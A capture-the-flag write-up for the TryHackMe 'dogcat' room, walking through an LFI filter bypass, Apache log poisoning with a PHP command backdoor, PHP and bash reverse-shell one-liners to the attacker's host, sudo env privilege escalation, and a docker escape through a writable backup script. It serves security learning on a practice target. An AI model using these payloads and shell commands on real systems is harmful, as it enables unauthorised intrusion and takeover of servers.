---
layout: default
---

# TryHackMe - dogcat writeup 

![dogcat header](/assets/images/vh_dogcat/dogcat_header.png)

[TryHackMe dogcat room link](https://tryhackme.com/room/dogcat)

:dog: :cat:

This system involves a slightly tricky Local File Inclusion (LFI) attack path located on the main Apache web server dogcat application. I then poison the web server logs with a simple PHP backdoor and gain code execution by viewing the log file via LFI. I then execute a PHP one liner reverse shell using this backdoor to gain the initial shell as the www-data user. I then escalate my privileges the first time to root using sudo /usr/bin/env gtfo escape. Then I escape the docker container to get actual reverse shell as root by exploiting a writeable backup script. 

## Initial recon
### Nmap scan
I do an fast (-T4) aggressive (-A) version (-SV) scan of all (-p-) TCP ports and save the scan to all (-oA) formats and set it to very verbose(-vv) to see results live.

```bash
sudo nmap -sV -A -T4 -vv -p- 10.10.92.56 -oA syn_ver_agg_all_tcp_ports
```

I also run a UDP (U) version scan of the top 1000 ports to see if there might be anything interesting there.

```bash
sudo nmap -sUV -vv 10.10.92.56 -oA udp_ver_top1000_ports
```

### Nmap results
#### TCP Scan

```
# Nmap 7.80 scan initiated Wed Jul 15 10:49:51 2020 as: nmap -sV -A -T4 -vv -p- -oA syn_ver_agg_all_tcp_ports 10.10.92.56

Nmap scan report for 10.10.92.56
Host is up, received reset ttl 63 (0.15s latency).
Scanned at 2020-07-15 10:49:51 EDT for 323s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeKBugyQF6HXEU3mbcoDHQrassdoNtJToZ9jaNj4Sj9MrWISOmr0qkxNx2sHPxz89dR0ilnjCyT3YgcI5rtcwGT9RtSwlxcol5KuDveQGO8iYDgC/tjYYC9kefS1ymnbm0I4foYZh9S+erXAaXMO2Iac6nYk8jtkS2hg+vAx+7+5i4fiaLovQSYLd1R2Mu0DLnUIP7jJ1645aqYMnXxp/bi30SpJCchHeMx7zsBJpAMfpY9SYyz4jcgCGhEygvZ0jWJ+qx76/kaujl4IMZXarWAqchYufg57Hqb7KJE216q4MUUSHou1TPhJjVqk92a9rMUU2VZHJhERfMxFHVwn3H
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBouHlbsFayrqWaldHlTkZkkyVCu3jXPO1lT3oWtx/6dINbYBv0MTdTAMgXKtg6M/CVQGfjQqFS2l2wwj/4rT0s=
|   256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIfp73VYZTWg6dtrDGS/d5NoJjoc4q0Fi0Gsg3Dl+M3I
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=7/15%OT=22%CT=1%CU=37310%PV=Y%DS=2%DC=T%G=Y%TM=5F0F18D
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=107%TI=Z%CI=Z%TS=A)SEQ(SP=FE
OS:%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=
OS:M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4
OS:B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7
OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIP
OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 17.187 days (since Sun Jun 28 06:25:36 2020)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### UDP Scan

```
# Nmap 7.80 scan initiated Wed Jul 15 10:56:51 2020 as: nmap -sUV -vv -oA udp_ver_top1000_ports 10.10.92.56

Nmap scan report for 10.10.92.56
Host is up, received echo-reply ttl 63 (0.18s latency).
Scanned at 2020-07-15 10:56:52 EDT for 1187s
Not shown: 999 closed ports
Reason: 999 port-unreaches
PORT   STATE         SERVICE REASON      VERSION
68/udp open|filtered dhcpc   no-response

# Nmap done at Wed Jul 15 11:16:39 2020 -- 1 IP address (1 host up) scanned in 1187.35 seconds
```

As you can see only port 22 (SSH) and 80 (Apache Web Server) are open. 
UDP shows port 68 (DHCP) which is not important in this instance.

## Web Server Enumeration

First I manually browse the website and explore its functionality. 
Right off the bat I notice the applications URL **view** parameter which seems like it can be an avanue for an LFI attack.

I tried multiple LFI URL code strings such as the traditional way to try and read the /etc/passwd file but they did not work.

This did not work as there is logic in the index.php source code that prevents this from happening easily. 
There are ways around this however as seen below.
```
http://10.10.124.115/?view=../../../../../../../etc/passwd
```

The LFI URL code string below did work.
```
http://10.10.124.115/?view=./dog/../../../../../etc/passwd&ext=
```

The passwd file did not contain anything interesting.


![dogcat web application](/assets/images/vh_dogcat/thm_dogcat_webapp_1.jpg)

I also run a dirbuster scan to see if I can discover any hidden directories or files on the web server.

![dogcat dirbuster scan results](/assets/images/vh_dogcat/thm_dogcat_dirbuster_scan.jpg)

The flag.php file looks interesting. I tried to read the file using a PHP filter wrapper code that converts the file to base64 and outputs it so I can read the flag.php code without executing it. 

This gives me the ability to also read the applications source code and thus I was able to see the index.php source code that reveals that we need to include the word dog or cat and set the **ext** parameter.

```
# Read the first flags contents
http://10.10.92.56/?view=php://filter/convert.base64-encode/resource=./dog/../flag
# Read the index.php source code
http://10.10.92.56/?view=php://filter/convert.base64-encode/resource=./dog/../index
```

![Local File Inclusion](/assets/images/vh_dogcat/thm_dogcat_lfi_1.jpg)

Base64 decode the string outputted and that will display the contents of the flag.php file.

Here is the index.php source code that I got via the LFI and PHP filter wrapper method.
If we analyze the index.php source code of the application we can understand that there is logic that needs to be fulfilled in order to get the LFI attack to work. The source code logic says that it must contain the word _dog_ or _cat_ and that it requires an **ext** parameter to be set or it will default to .php as the extention for the specified file.

```php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

## Local File Inclusion to Code Execution.

So now that I know I can read files I try to read the Apache server logs located at /var/log/apache2/access.log using the LFI.
I then poison the log file with a simple PHP backdoor code that will give me code execution on the system.
I first capture a simple GET request to the application using burpsuit proxy.
I then modify the **User-Agent:** header and insert the following PHP code into it.

```php
<?php system($_GET['cmd']);?>
```

![Burpsuit poison php header](/assets/images/vh_dogcat/thm_dogcat_burpsuit_1.jpg)

Now that we I have poisoned the logs I try to execute a simple whoami command to see if it works and it does.
```
http://10.10.124.115/?view=dog../../../../../../var/log/apache2/access.log&ext=&cmd=whoami
```

![dogcat LFI to code execution](/assets/images/vh_dogcat/thm_dogcat_lfi_2.jpg)

Now I use the following PHP reverse shell one-liner from pentestmonkey.net
```
php -r '$sock=fsockopen("10.11.11.11",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

![LFI to reverse shell](/assets/images/vh_dogcat/thm_dogcat_burpsuit_2.jpg)

I had to URL encode all characters in the php reverse shell code to get it to work properly.

![URL encoded php reverse shell](/assets/images/vh_dogcat/thm_dogcat_burpsuit_3.jpg)

I start a netcat listener on my attacking machine on port 1234 and then send the above GET request using burpsuit to gain the initial shell on the system as the ***www-data** user. With a tiny bit of directory enumeration I find the second flag.

```
sudo nc -nvlp 1234
```

![Initial Shell](/assets/images/vh_dogcat/thm_dogcat_initial_shell.jpg)

## Privilege Escalation

I do a the following sudo command to see what I can execute as sudo.
```
sudo -l
```

![SUDO Privilege Escalation via env](/assets/images/vh_dogcat/thm_dogcat_flag3.jpg)

I see that I can execute /usr/bin/env as sudo. I go to GTFOBins and find a way to escalate my privileges to root.

https://gtfobins.github.io/gtfobins/env/#sudo

I simply execute the following code as sudo to get a shell as root.

```
sudo env /bin/sh
```

My first got to for quick enumeration is [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) - Linux local Privilege Escalation Awesome Script.
I host it on my attacking machine using a simple python3 web server with the command below on port 80
```
sudo python3 -m http.server 80
```

I downloaded linpeas using curl as wget was not available. Adjusted the files permissions to execute and then ran it.
```
cd /tmp
curl http://10.11.11.11/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh 
```

I noticed two odd things that indicated that we were in a docker container. The first being a random hostname and the second being the .dockerenv file.

![Docker Files](/assets/images/vh_dogcat/thm_dogcat_docker.jpg)

## Escaping Docker Container

Upon further enumeration I found backup.sh script file located in the /opt/backup directory.
Writing the following reverse shell bash code to the backup.sh file results in a root shell outside of the container.
```
echo "#!/bin/bash" > backup.sh;echo "bash -i >& /dev/tcp/10.11.11.11/9001 0>&1" >> backup.sh
```

Run a listener on the attacking machine and get root shell.
```
sudo nc -nvlp 9001
```

![Root and Flag 4](/assets/images/vh_dogcat/thm_dogcat_root_and_flag4.jpg)

That marks the end of this system, obtaining all 4 flags. The most interesting parts were the unusual LFI attack path due to the logic found in the index.php file and the fact that we were in a docker container that we had to escape to get a final root shell at the end.